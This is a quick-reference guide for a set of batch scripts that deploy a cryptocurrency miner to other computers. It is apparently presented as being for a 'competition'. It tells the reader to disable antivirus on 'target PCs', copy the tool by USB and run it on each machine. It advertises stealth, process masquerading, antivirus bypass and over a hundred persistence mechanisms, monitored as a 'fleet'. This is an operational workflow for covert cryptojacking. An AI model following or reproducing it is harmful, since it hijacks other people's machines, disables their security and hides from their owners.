  WHICH SCRIPT TO USE - Quick Reference Guide
================================================================

FOR YOUR PERSONAL PC (i5-6500):
================================

1. START_SAFE_TEST.bat  [RECOMMENDED]
   ‚úÖ Tests ALL features (stealth, persistence, etc.)
   ‚úÖ Minimal impact (35% CPU, 2 threads, low priority)
   ‚úÖ Won't damage or stress your PC
   ‚úÖ Verifies everything works before competition
   
   USE THIS TO: Test full deployment without risk


2. TEST_SIMPLE.bat
   ‚úÖ Just mines, no features
   ‚úÖ Quick hashrate test
   
   USE THIS TO: Verify basic mining works


3. DIAGNOSE.bat
   ‚úÖ Checks all requirements
   ‚úÖ Shows what's wrong
   
   USE THIS TO: Troubleshoot issues


4. DISABLE_AV_FOR_TESTING.bat
   ‚ö†Ô∏è Temporarily disables antivirus
   
   USE THIS: Before running START_SAFE_TEST.bat
   (Needed because script has AV bypass code)


5. ENABLE_AV.bat
   ‚úÖ Re-enables antivirus
   
   USE THIS: After testing is complete



FOR COMPETITION PCs (i5-14400):
=================================

1. üöÄ_START_HERE.bat  [MAIN DEPLOYMENT]
   ‚úÖ Full stealth + persistence + optimizations
   ‚úÖ Max performance (75% CPU default, auto-adjusts)
   ‚úÖ All 100+ persistence mechanisms
   ‚úÖ Process masquerading, AV evasion
   
   USE THIS: Main deployment on competition day
   (Make sure AV is disabled on target PCs)


2. START_HERE_VERBOSE.bat
   ‚úÖ Same as above but shows everything
   ‚úÖ Helpful for debugging on competition PCs
   
   USE THIS: If deployment fails, to see errors



================================================================
  RECOMMENDED WORKFLOW
================================================================

STEP 1: Test on Your PC First
------------------------------
1. Run DISABLE_AV_FOR_TESTING.bat
2. Run START_SAFE_TEST.bat
3. Verify all features work:
   - Miner starts
   - Stealth mechanisms activate
   - Persistence installs
   - No errors in logs
4. Run ENABLE_AV.bat
5. Kill the miner (Ctrl+C)


STEP 2: Deploy on Competition PCs
----------------------------------
1. Disable AV on target PCs (manually)
2. Copy "New folder" to USB
3. Run üöÄ_START_HERE.bat on each PC
4. Verify with MONITOR_FLEET.ps1

  FAQ
================================================================

Q: Will START_SAFE_TEST damage my PC?
A: No. It runs at 35% CPU with low priority. Safe for 24/7.

Q: Does START_SAFE_TEST test everything?
A: Yes! All stealth, persistence, optimizations - just runs gently.

Q: Why do I need to disable AV?
A: Script contains AV bypass code (needed for competition).
   Your AV blocks it as "malicious" even though it's for testing.

Q: Can I use START_HERE on my PC at full power?
A: Yes, but your i5-6500 is older/weaker. Won't perform well.
   Better to test with SAFE mode, deploy full on competition PCs.

Q: What if competition PCs have AV?
A: Script has universal AV bypass built-in. Works on most AVs.
   But manual disable is more reliable.

  PERFORMANCE EXPECTATIONS
================================================================

Your PC (i5-6500, 4 threads, 8GB RAM):
- SAFE mode: 400-600 H/s
- Full power: 1200-1800 H/s

Competition PCs (i5-14400, 20 threads, 16GB RAM):
- Optimized: 5500-6500 H/s (3-4x faster!)
